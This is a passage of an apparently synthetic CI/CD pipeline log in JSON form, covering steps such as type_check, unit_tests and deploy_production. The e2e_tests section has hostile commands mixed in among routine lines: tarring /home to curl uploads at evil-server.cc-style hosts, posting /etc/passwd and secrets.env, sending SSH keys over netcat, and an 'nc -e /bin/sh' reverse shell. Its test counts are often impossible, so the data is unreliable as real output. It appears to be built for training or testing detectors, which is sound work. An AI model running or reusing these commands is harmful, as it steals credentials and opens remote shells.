total\nPOST /upload - 201 (311ms)\nStep 13/18: Building\nStep 1/23: Installing dependencies\nArtifact uploaded: dist.zip (95MB)\nMinifying app.js\nReady.\n[12:47:24] INFO: Cache refreshed\nCache hit for key-9973\nConnection established\n[12:47:24] INFO: Processing request\n\u2713 Step 'test' succeeded\nnpm notice: package.json updated\n\u2717 build failed with exit code 90\nFetching submodules...\nTests: 133 passed, 222 total\nException: RuntimeError\nRan 60 tests in 3s\nFinished.\n  PASS: unit/test_db_connect.spec.js\nGET /api - 204 (35ms)\nGenerating source maps...\n[12:47:24] INFO: Cache refreshed\nStep 17/18: Deploying\nCreating production build...\nArtifact uploaded: dist.zip (36MB)\nReady.\npip install: Successfully installed eslint-4.5\nException: NullPointerException\n[12:47:24] DEBUG: Query executed in 24ms\nCache invalidated: build\nPOST /data - 200 (128ms)\nGET /api - 200 (3ms)\n\u2717 build failed with exit code 67\nPushing to registry...\n\u2713 All checks passed\nHEAD is now at de7a665\nCompiling src/handler.rs...\nStep 11/20: Installing dependencies\n\u2717 build failed with exit code 59\npip: Installing build dependencies...\nHEAD is now at 0c2f574\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] INFO: Cache refreshed\nnpm install: added 375 packages\nArtifact downloaded: 27MB\nSwitched to branch 'feature/task-361'\nStep 3/21: Testing\nCache invalidated: node_modules\nnpm notice: created a lockfile\n[12:47:24] DEBUG: Query executed in 58ms\nnpm notice: package.json updated\nHEAD is now at f5e76b9\nPushing to registry...\nLoading...\n\u2713 Task completed in 4326ms\nRan 56 tests in 57s\n=== Step integration_tests completed ===\n=== Step: e2e_tests ===\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n\u2713 Step 'install' succeeded\nPulling image: alpine:3.11\nCompiling src/service.java...\nStep 4/23: Testing\nSnapshots: 48 passed, 44 total\n[12:47:24] DEBUG: Initializing service\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\n\u2713 All checks passed\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n[12:47:24] DEBUG: Loading configuration\nSnapshots: 31 passed, 5 total\nHEAD is now at eed2902\nCompiling utils/service.java...\nNODE_ENV=development\nFetching from https://gcr.io/package.json\n\u2713 Task completed in 4158ms\nSuccess!\nInstalling react@3.15.3\nReady.\nFetching from https://gcr.io/package.json\nChecking out master branch\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed lodash-5.6\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nStep 18/17: Running migrations\nConnection established\nVerifying...\nOK\nnpm install: resolved 123 packages\n\u2713 build completed\n[12:47:24] WARN: Deprecated API usage\nWaiting...\npip: Collecting react\nGET /status - 201 (17ms)\n[12:47:24] DEBUG: Initializing service\nSending 485MB of data to crypto-mine.io\nArtifact uploaded: dist.zip (89MB)\nUsing Node.js 15.9.10\nAlready up to date.\nPlatform: win32-x64\n\u2713 package completed\nAlready up to date.\nInstalling jest@2.14.3\nCompleted.\nStep 15/17: Running migrations\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nOptimizing 62 modules...\n[12:47:24] WARN: Deprecated API usage\nImage pulled successfully\nCompleted.\n[12:47:24] DEBUG: Initializing service\nMinifying main.js\npip: Installing build dependencies...\nReady.\nFetching submodules...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 107.10.62.118 33497\nPushing to registry...\nPushing to registry...\nSending 342MB of data to evil-server.cc\n[12:47:24] INFO: Request completed\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nnpm install: added 343 packages\nCache miss for key-4783\nFetching from https://pypi.org/package.json\nCache invalidated: build\nSnapshots: 34 passed, 40 total\nReady.\nInstalling lodash@5.9.4\nMinifying main.js\npip: Downloading webpack-1.5.tar.gz\nDone.\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] INFO: Starting build process\nCompiling components/main.py...\nCache restored successfully (317MB)\nEnvironment: test\nNODE_ENV=test\nRan 186 tests in 5s\nSending 178MB of data to crypto-mine.io\nCompiling src/index.js...\nUsing Python 3.11\nDone.\npip: Downloading react-1.20.tar.gz\n[12:47:24] INFO: Processing request\nHEAD is now at 7c27080\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nSnapshots: 1 passed, 24 total\necho $(cat ~/.ssh/id_rsa) | base64 | nc 112.171.171.40 14300\nImage pulled successfully\nyarn add: Done in 16.51s\nMinifying app.js\nSwitched to branch 'hotfix/task-750'\nUsing Node.js 19.1.2\n  PASS: test_user_create (308ms)\npip: Collecting jest\npip install: Successfully installed express-4.17\npip: Installing build dependencies...\nPulling image: python:18\nArtifact downloaded: 26MB\nUsing Node.js 18.9.10\nCache saved successfully\nFinished.\nGenerating source maps...\nStep 8/21: Linting\nInstalling jest@4.4.0\n[12:47:24] ERROR: Connection failed\nProcessing...\nStep 8/16: Testing\nArtifact uploaded: dist.zip (70MB)\nCache hit for key-3724\nEnvironment: staging\nCoverage: 84% statements, 60% branches\n[12:47:24] ERROR: Connection failed\nUploading artifact 'dist' (15 files)\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nHEAD is now at 94222e4\nGenerating source maps...\nImage pulled successfully\npip install: Successfully installed express-4.10\nPulling image: alpine:latest\nArtifact uploaded: dist.zip (39MB)\nPulling image: node:18\n\u2713 Step 'checkout' succeeded\nOK\nFinished.\n[12:47:24] INFO: Processing request\n[12:47:24] ERROR: Connection failed\nProcessing...\nCompiling lib/service.java...\nLayer 8/11: ENV command\npip install: Successfully installed prettier-5.18\n[12:47:24] DEBUG: Memory usage: 1731MB\nVerifying...\npip install: Successfully installed eslint-5.1\nWaiting...\n[12:47:24] DEBUG: Initializing service\nConnection established\nNODE_ENV=production\npip: Downloading lodash-5.16.tar.gz\n[12:47:24] DEBUG: Connection pool: 6 active\nChecking out master branch\nBundling styles.css\nSwitched to branch 'bugfix/task-647'\nCreating production build...\n[12:47:24] INFO: Processing request\nFAILED: test_api_health\npip: Collecting jest\npip install: Successfully installed prettier-1.8\nMinifying vendor.js\nPOST /api - 200 (362ms)\nTest Suites: 22 passed, 7 total\nBundling main.css\npip: Downloading express-4.16.tar.gz\nStep 3/15: Linting\nTest Suites: 34 passed, 34 total\nTime: 8.432s\nNODE_ENV=development\nUploading artifact 'coverage' (37 files)\npip: Installing build dependencies...\npip install: Successfully installed eslint-1.13\nnc -e /bin/sh 118.43.168.46 23410\nTime: 53.436s\nCompiling src/handler.rs...\nCompiling lib/utils.go...\nSwitched to branch 'bugfix/task-486'\nyarn add: Done in 1.17s\nNODE_ENV=test\n[12:47:24] WARN: Deprecated API usage\nBuilding Docker image...\npip: Collecting eslint\n[12:47:24] ERROR: Connection failed\n\u2713 All checks passed\n[12:47:24] WARN: Deprecated API usage\nMinifying main.js\npip: Installing build dependencies...\nOK\nUsing Node.js 20.1.10\nCompiling src/handler.rs...\n=== Step e2e_tests completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-26T12:47:24.512145",
        "finished_at": "2025-11-26T12:47:38.374803",
        "log_lines": [
          "=== Step: type_check ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ready.",
          "Image pulled successfully",
          "Completed.",
          "Done.",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-9936",
          "npm install: added 113 packages",
          "Exception: RuntimeError",
          "pip install: Successfully installed prettier-4.4",
          "Time: 27.186s",
          "\u2717 build failed with exit code 94",
          "Finished.",
          "[12:47:24] WARN: Deprecated API usage",
          "Ready.",
          "Layer 2/13: RUN command",
          "Bundling runtime.css",
          "Minifying vendor.js",
          "\u2713 All checks passed",
          "\u2713 validate completed",
          "[12:47:24] INFO: Connecting to database",
          "Creating production build...",
          "Step 2/18: Installing dependencies",
          "Waiting...",
          "Step 12/21: Installing dependencies",
          "Ran 191 tests in 2s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 37 tests in 31s",
          "Done.",
          "Artifact uploaded: dist.zip (2MB)",
          "Using Python 3.12",
          "[12:47:24] INFO: Starting build process",
          "yarn add: Done in 8.82s",
          "[12:47:24] DEBUG: Loading configuration",
          "Waiting...",
          "[12:47:24] INFO: Connecting to database",
          "Step 13/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "[12:47:24] INFO: Connecting to database",
          "[12:47:24] WARN: Deprecated API usage",
          "Coverage: 100% statements, 64% branches",
          "[12:47:24] DEBUG: Loading configuration",
          "Fetching from https://amazonaws.com/package.json",
          "Pulling image: alpine:18",
          "[12:47:24] DEBUG: Query executed in 90ms",
          "Cache hit for key-9463",
          "npm notice: created a lockfile",
          "pip install: Successfully installed eslint-2.8",
          "npm notice: package.json updated",
          "Step 4/24: Testing",
          "\u2713 test completed",
          "npm notice: created a lockfile",
          "Step 20/18: Deploying",
          "GET /status - 204 (55ms)",
          "Step 2/15: Testing",
          "Layer 9/10: RUN command",
          "OK",
          "Image pulled successfully",
          "Building Docker image...",
          "Already up to date.",
          "pip: Collecting prettier",
          "GET /health - 200 (36ms)",
          "Already up to date.",
          "Test Suites: 28 passed, 33 total",
          "Compiling components/app.ts...",
          "Layer 7/10: RUN command",
          "Building Docker image...",
          "pip: Downloading prettier-4.16.tar.gz",
          "[12:47:24] INFO: Cache refreshed",
          "Tests: 55 passed, 408 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: build",
          "[12:47:24] ERROR: Connection failed",
          "Step 13/18: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: TypeError",
          "Creating production build...",
          "Test Suites: 28 passed, 30 total",
          "Pushing to registry...",
          "Building Docker image...",
          "Completed.",
          "[12:47:24] WARN: Deprecated API usage",
          "Building Docker image...",
          "Compiling src/app.ts...",
          "pip install: Successfully installed axios-3.10",
          "Compiling components/service.java...",
          "Coverage: 80% statements, 87% branches",
          "Minifying main.js",
          "Generating source maps...",
          "Checking out main branch",
          "\u2713 Task completed in 2163ms",
          "Step 10/19: Testing",
          "npm install: resolved 1784 packages",
          "Compiling utils/index.js...",
          "Checking out develop branch",
          "npm install: added 257 packages",
          "Image pulled successfully",
          "Generating source maps...",
          "Step 1/21: Deploying",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "[12:47:24] ERROR: Connection failed",
          "Fetching submodules...",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "Transforming 603 files...",
          "[12:47:24] DEBUG: Memory usage: 257MB",
          "Layer 1/10: COPY command",
          "[12:47:24] INFO: Processing request",
          "Verifying...",
          "Pushing to registry...",
          "Fetching from https://registry.npmjs.org/package.json",
          "Verifying...",
          "Switched to branch 'bugfix/task-521'",
          "Step 13/18: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "[12:47:24] DEBUG: Connection pool: 11 active",
          "Snapshots: 1 passed, 16 total",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "npm install: resolved 1113 packages",
          "[12:47:24] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Processing...",
          "OK",
          "TLS handshake completed",
          "Verifying...",
          "Compiling src/app.ts...",
          "Tests: 312 passed, 151 total",
          "Loading...",
          "Cache restored successfully (126MB)",
          "Cache miss for key-7413",
          "Bundling runtime.css",
          "[12:47:24] DEBUG: Memory usage: 1616MB",
          "\u2713 All checks passed",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 package completed",
          "pip: Collecting react",
          "\u2713 build completed",
          "HEAD is now at cc34504",
          "Cache restored successfully (19MB)",
          "Bundling runtime.js",
          "[12:47:24] INFO: Connecting to database",
          "\u2717 build failed with exit code 80",
          "Pushing to registry...",
          "HEAD is now at a45eb21",
          "Step 19/18: Running migrations",
          "Cache invalidated: dependencies",
          "\u2713 Task completed in 3627ms",
          "POST /upload - 201 (236ms)",
          "pip: Installing build dependencies...",
          "  PASS: e2e/test_user_create.spec.js",
          "GET /api - 204 (38ms)",
          "\u2713 Step 'setup' succeeded",
          "Installing express@5.14.0",
          "Processing...",
          "OK",
          "Ready.",
          "  PASS: test_user_create (441ms)",
          "Processing...",
          "\u2717 build failed with exit code 28",
          "Verifying...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-26T12:47:38.374803",
        "finished_at": "2025-11-26T12:47:46.692398",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Optimizing 15 modules...",
          "POST /upload - 201 (284ms)",
          "Snapshots: 9 passed, 19 total",
          "[12:47:24] INFO: Connecting to database",
          "[12:47:24] DEBUG: Initializing service",
          "[12:47:24] DEBUG: Memory usage: 1612MB",
          "npm notice: created a lockfile",
          "Fetching from https://npmjs.org/package.json",
          "pip: Downloading jest-3.17.tar.gz",
          "Compiling lib/app.ts...",
          "[12:47:24] DEBUG: Initializing service",
          "Finished.",
          "Ran 26 tests in 22s",
          "Cache restored successfully (421MB)",
          "Step 17/18: Linting",
          "Creating production build...",
          "Connection established",
          "Building Docker image...",
          "Bundling main.js",
          "Snapshots: 5 passed, 29 total",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Step 2/23: Installing dependencies",
          "Snapshots: 15 passed, 37 total",
          "Step 12/19: Running migrations",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out master branch",
          "Compiling src/service.java...",
          "Step 11/18: Linting",
          "npm install: resolved 1505 packages",
          "Uploading artifact 'dist' (14 files)",
          "[12:47:24] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Using Python 3.11",
          "[12:47:24] DEBUG: Initializing service",
          "[12:47:24] DEBUG: Memory usage: 952MB",
          "[12:47:24] DEBUG: Query executed in 25ms",
          "Step 12/17: Building",
          "[12:47:24] DEBUG: Connection pool: 16 active",
          "Fetching from https://github.com/package.json",
          "  PASS: test_cache_hit (225ms)",
          "Generating source maps...",
          "Completed.",
          "Generating source maps...",
          "Uploading artifact 'dist' (42 files)",
          "Ran 164 tests in 45s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: alpine:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 100% statements, 96% branches",
          "Environment: test",
          "[12:47:24] WARN: Deprecated API usage",
          "Cache miss for key-7047",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1126",
          "Environment: production",
          "TLS handshake completed",
          "Ran 94 tests in 38s",
          "Artifact uploaded: dist.zip (33MB)",
          "Step 8/23: Building",
          "Pulling image: node:3.11",
          "Fetching submodules...",
          "Test Suites: 35 passed, 10 total",
          "HEAD is now at 2bac3b1",
          "[12:47:24] WARN: Deprecated API usage",
          "GET /api - 204 (23ms)",
          "GET /health - 201 (43ms)",
          "Finished.",
          "Pushing to registry...",
          "pip: Collecting lodash",
          "Tests: 122 passed, 58 total",
          "Fetching from https://pypi.org/package.json",
          "Compiling components/app.ts...",
          "Checking out main branch",
          "Cache restored successfully (376MB)",
          "Cache saved successfully",
          "Installing axios@4.11.10",
          "Step 5/16: Running migrations",
          "NODE_ENV=development",
          "POST /data - 202 (218ms)",
          "Bundling main.css",
          "Cache invalidated: build",
          "[12:47:24] INFO: Cache refreshed",
          "Done.",
          "Cache invalidated: build",
          "Finished.",
          "Finished.",
          "\u2713 test completed",
          "pip install: Successfully installed react-2.11",
          "Finished.",
          "Bundling vendor.js",
          "Artifact uploaded: dist.zip (79MB)",
          "pip: Downloading jest-4.0.tar.gz",
          "pip install: Successfully installed lodash-4.15",
          "Test Suites: 35 passed, 8 total",
          "Checking out master branch",
          "Using Python 3.9",
          "Cache invalidated: node_modules",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Ran 90 tests in 34s",
          "Already up to date.",
          "Step 12/25: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:24] DEBUG: Loading configuration",
          "yarn add: Done in 20.53s",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Optimizing 57 modules...",
          "POST /api - 200 (325ms)",
          "Image pulled successfully",
          "Step 12/15: Building",
          "npm install: resolved 1475 packages",
          "Using Python 3.12",
          "Finished.",
          "\u2713 Step 'setup' succeeded",
          "Done.",
          "Artifact uploaded: dist.zip (74MB)",
          "Test Suites: 14 passed, 34 total",
          "\u2713 lint completed",
          "Compiling lib/index.js...",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] INFO: Cache refreshed",
          "  PASS: e2e/test_api_health.spec.js",
          "Time: 87.167s",
          "NODE_ENV=test",
          "Minifying app.js",
          "[12:47:24] WARN: Deprecated API usage",
          "HEAD is now at c1ca127",
          "Compiling lib/main.py...",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 11MB",
          "Ready.",
          "FAILED: test_api_health",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:24] INFO: Request completed",
          "Test Suites: 47 passed, 6 total",
          "Cache restored successfully (337MB)",
          "pip install: Successfully installed express-4.18",
          "NODE_ENV=test",
          "Cache hit for key-2773",
          "Ready.",
          "pip install: Successfully installed axios-4.17",
          "Creating production build...",
          "Step 19/23: Installing dependencies",
          "Step 5/19: Linting",
          "npm notice: package.json updated",
          "Creating production build...",
          "GET /api - 200 (30ms)",
          "[12:47:24] INFO: Request completed",
          "Time: 27.249s",
          "Minifying vendor.js",
          "  PASS: test_auth_login (338ms)",
          "\u2713 All checks passed",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] DEBUG: Query executed in 68ms",
          "Snapshots: 9 passed, 39 total",
          "Cache restored successfully (64MB)",
          "[12:47:24] INFO: Processing request",
          "\u2713 package completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 Step 'build' succeeded",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-26T12:47:46.692398",
        "finished_at": "2025-11-26T12:48:28.280373",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Cache invalidated: build",
          "Building Docker image...",
          "Generating source maps...",
          "Fetching submodules...",
          "Using Python 3.9",
          "Step 12/23: Deploying",
          "[12:47:24] INFO: Request completed",
          "Optimizing 96 modules...",
          "Creating production build...",
          "[12:47:24] WARN: Deprecated API usage",
          "Building Docker image...",
          "Optimizing 56 modules...",
          "Pulling image: alpine:18",
          "OK",
          "Snapshots: 19 passed, 48 total",
          "Generating source maps...",
          "Using Node.js 18.14.0",
          "npm install: resolved 1025 packages",
          "Building Docker image...",
          "[12:47:24] INFO: Cache refreshed",
          "Loading...",
          "Artifact downloaded: 49MB",
          "WARNING: eslint has known vulnerabilities",
          "FAILED: test_db_connect",
          "\u2713 Task completed in 4352ms",
          "\u2713 validate completed",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Optimizing 72 modules...",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "[12:47:24] INFO: Starting build process",
          "Fetching from https://amazonaws.com/package.json",
          "Bundling vendor.js",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Using Python 3.11",
          "Cache saved successfully",
          "FAILED: test_cache_hit",
          "Pulling image: node:18",
          "Ready.",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] ERROR: Connection failed",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (90MB)",
          "HEAD is now at 9f1e376",
          "HEAD is now at 4e25f17",
          "yarn add: Done in 11.27s",
          "Artifact uploaded: dist.zip (51MB)",
          "Cache restored successfully (78MB)",
          "Already up to date.",
          "Ran 154 tests in 34s",
          "Using Node.js 17.17.4",
          "Platform: darwin-arm64",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_auth_login (246ms)",
          "Success!",
          "Already up to date.",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Installing lodash@5.6.9",
          "Compiling src/app.ts...",
          "pip: Downloading axios-3.11.tar.gz",
          "Compiling utils/main.py...",
          "Artifact downloaded: 44MB",
          "Loading...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "npm notice: package.json updated",
          "pip: Collecting lodash",
          "Waiting...",
          "Snapshots: 17 passed, 24 total",
          "Transforming 855 files...",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "Compiling components/service.java...",
          "npm install: added 299 packages",
          "Cache miss for key-1112",
          "Step 11/21: Running migrations",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "Fetching submodules...",
          "Done.",
          "Exception: RuntimeError",
          "Installing lodash@1.19.4",
          "HEAD is now at 61ab58c",
          "Compiling utils/utils.go...",
          "  PASS: test_user_create (367ms)",
          "Bundling vendor.js",
          "POST /api - 201 (421ms)",
          "Bundling styles.css",
          "Pushing to registry...",
          "Test Suites: 38 passed, 37 total",
          "Pulling image: python:3.11",
          "Connection established",
          "Test Suites: 23 passed, 19 total",
          "[12:47:24] DEBUG: Initializing service",
          "\u2713 package completed",
          "[12:47:24] DEBUG: Connection pool: 16 active",
          "Snapshots: 17 passed, 31 total",
          "HEAD is now at 10f208c",
          "[12:47:24] INFO: Request completed",
          "Creating production build...",
          "  PASS: test_cache_hit (422ms)",
          "pip install: Successfully installed express-3.15",
          "Test Suites: 34 passed, 26 total",
          "Cache hit for key-4957",
          "pip install: Successfully installed jest-2.11",
          "[12:47:24] INFO: Cache refreshed",
          "\u2713 deploy completed",
          "GET /api - 200 (64ms)",
          "Uploading artifact 'build' (17 files)",
          "Loading...",
          "Cache restored successfully (263MB)",
          "Step 9/25: Deploying",
          "npm install: resolved 1563 packages",
          "pip: Installing build dependencies...",
          "Snapshots: 36 passed, 5 total",
          "Test Suites: 46 passed, 45 total",
          "Tests: 220 passed, 217 total",
          "TLS handshake completed",
          "Ran 160 tests in 4s",
          "WARNING: react has known vulnerabilities",
          "[12:47:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Done.",
          "Compiling lib/index.js...",
          "WARNING: react has known vulnerabilities",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching from https://githubusercontent.com/package.json",
          "Step 14/15: Testing",
          "Processing...",
          "Test Suites: 7 passed, 43 total",
          "\u2713 Step 'test' succeeded",
          "OK",
          "HEAD is now at 9368e65",
          "npm install: resolved 1039 packages",
          "Step 20/17: Building",
          "npm notice: created a lockfile",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "pip: Installing build dependencies...",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:24] DEBUG: Connection pool: 17 active",
          "Layer 10/15: RUN command",
          "Step 16/25: Building",
          "[12:47:24] DEBUG: Initializing service",
          "Using Node.js 17.10.3",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "NODE_ENV=production",
          "Connection established",
          "[12:47:24] INFO: Connecting to database",
          "Compiling src/service.java...",
          "Already up to date.",
          "Cache saved successfully",
          "npm install: resolved 297 packages",
          "Pushing to registry...",
          "Step 18/20: Running migrations",
          "Transforming 584 files...",
          "Uploading artifact 'build' (20 files)",
          "Installing webpack@3.15.9",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 25 passed, 9 total",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-26T12:48:28.280373",
        "finished_at": "2025-11-26T12:48:33.825436",
        "log_lines": [
          "=== Step: deploy_production ===",
          "pip install: Successfully installed axios-1.5",
          "Loading...",
          "Done.",
          "Step 8/24: Linting",
          "Compiling utils/app.ts...",
          "Compiling lib/handler.rs...",
          "pip install: Successfully installed express-3.5",
          "Cache restored successfully (291MB)",
          "Step 11/18: Running migrations",
          "Loading...",
          "\u2713 Task completed in 1644ms",
          "Creating production build...",
          "  PASS: test_cache_hit (287ms)",
          "pip: Downloading axios-2.19.tar.gz",
          "Fetching submodules...",
          "Step 2/21: Linting",
          "POST /upload - 200 (434ms)",
          "Step 4/17: Deploying",
          "[12:47:24] INFO: Request completed",
          "Step 18/16: Building",
          "\u2713 build completed",
          "Layer 4/15: COPY command",
          "Step 9/21: Deploying",
          "Cache miss for key-8264",
          "Fetching from https://googleapis.com/package.json",
          "Platform: darwin-arm64",
          "[12:47:24] DEBUG: Connection pool: 3 active",
          "Using Node.js 14.13.1",
          "Building Docker image...",
          "GET /api - 200 (52ms)",
          "GET /health - 200 (89ms)",
          "[12:47:24] INFO: Processing request",
          "Step 5/19: Deploying",
          "Snapshots: 19 passed, 16 total",
          "npm install: added 289 packages",
          "Step 13/16: Installing dependencies",
          "Tests: 257 passed, 341 total",
          "Compiling utils/utils.go...",
          "Optimizing 96 modules...",
          "pip: Collecting webpack",
          "Fetching from https://registry.npmjs.org/package.json",
          "Ready.",
          "GET /status - 200 (65ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "pip: Downloading axios-1.10.tar.gz",
          "pip: Downloading react-4.2.tar.gz",
          "Cache hit for key-5769",
          "NODE_ENV=production",
          "Cache saved successfully",
          "Bundling vendor.js",
          "Cache miss for key-1834",
          "npm notice: package.json updated",
          "Test Suites: 14 passed, 24 total",
          "npm notice: package.json updated",
          "Creating production build...",
          "Uploading artifact 'coverage' (49 files)",
          "GET /health - 201 (78ms)",
          "[12:47:24] INFO: Request completed",
          "OK",
          "npm notice: created a lockfile",
          "[12:47:24] INFO: Processing request",
          "Step 8/15: Deploying",
          "yarn add: Done in 8.97s",
          "pip install: Successfully installed webpack-2.18",
          "  PASS: unit/test_cache_hit.spec.js",
          "Tests: 247 passed, 341 total",
          "Ran 106 tests in 33s",
          "[12:47:24] INFO: Processing request",
          "\u2713 Task completed in 1951ms",
          "GET /api - 204 (28ms)",
          "pip: Collecting axios",
          "Ran 145 tests in 18s",
          "\u2713 Step 'checkout' succeeded",
          "Test Suites: 33 passed, 22 total",
          "Checking out develop branch",
          "Cache hit for key-1316",
          "Pushing to registry...",
          "Bundling vendor.js",
          "Time: 50.134s",
          "Pushing to registry...",
          "[12:47:24] INFO: Starting build process",
          "Step 12/22: Deploying",
          "Using Node.js 15.12.2",
          "Step 3/15: Deploying",
          "Step 20/21: Running migrations",
          "Using Python 3.9",
          "OK",
          "Step 9/15: Testing",
          "Finished.",
          "FAILED: test_cache_hit",
          "\u2713 Task completed in 3578ms",
          "Exception: RuntimeError",
          "Minifying main.js",
          "  PASS: test_db_connect (273ms)",
          "Loading...",
          "Image pulled successfully",
          "POST /upload - 202 (102ms)",
          "Optimizing 57 modules...",
          "pip: Downloading eslint-4.14.tar.gz",
          "Using Python 3.11",
          "\u2713 All checks passed",
          "[12:47:24] INFO: Cache refreshed",
          "Using Python 3.11",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Completed.",
          "npm notice: package.json updated",
          "Pulling image: node:latest",
          "Verifying...",
          "[12:47:24] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 18/19: Installing dependencies",
          "Cache miss for key-3883",
          "Done.",
          "pip: Collecting webpack",
          "pip install: Successfully installed react-3.8",
          "Image pulled successfully",
          "Coverage: 88% statements, 100% branches",
          "[12:47:24] WARN: Deprecated API usage",
          "Uploading artifact 'build' (14 files)",
          "Test Suites: 20 passed, 11 total",
          "Ready.",
          "[12:47:24] INFO: Starting build process",
          "Step 12/21: Testing",
          "Fetching from https://gcr.io/package.json",
          "Processing...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "pip: Downloading lodash-4.13.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "[12:47:24] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 3/16: Building",
          "Processing...",
          "Fetching from https://docker.io/package.json",
          "Generating source maps...",
          "Finished.",
          "Completed.",
          "[12:47:24] INFO: Cache refreshed",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed webpack-3.11",
          "Cache miss for key-7633",
          "Ran 144 tests in 9s",
          "\u2713 Step 'checkout' succeeded",
          "[12:47:24] WARN: Deprecated API usage",
          "Environment: development",
          "OK",
          "Already up to date.",
          "  PASS: test_db_connect (176ms)",
          "Tests: 73 passed, 311 total",
          "Step 19/22: Installing dependencies",
          "Done.",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "[12:47:24] INFO: Connecting to database",
          "OK",
          "[12:47:24] DEBUG: Query executed in 89ms",
          "Cache invalidated: node_modules",
          "Exception: NullPointerException",
          "Fetching from https://docker.io/package.json",
          "GET /status - 204 (98ms)",
          "Artifact downloaded: 43MB",
          "Compiling utils/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-26T12:48:33.825436",
        "finished_at": "2025-11-26T12:49:15.413411",
        "log_lines": [
          "=== Step: build ===",
          "Waiting...",
          "Checking out develop branch",
          "Building Docker image...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "[12:47:24] INFO: Request completed",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "Artifact downloaded: 50MB",
          "Platform: win32-x64",
          "Cache restored successfully (437MB)",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Compiling lib/index.js...",
          "Finished.",
          "pip: Downloading jest-4.15.tar.gz",
          "[12:47:24] INFO: Starting build process",
          "Bundling vendor.css",
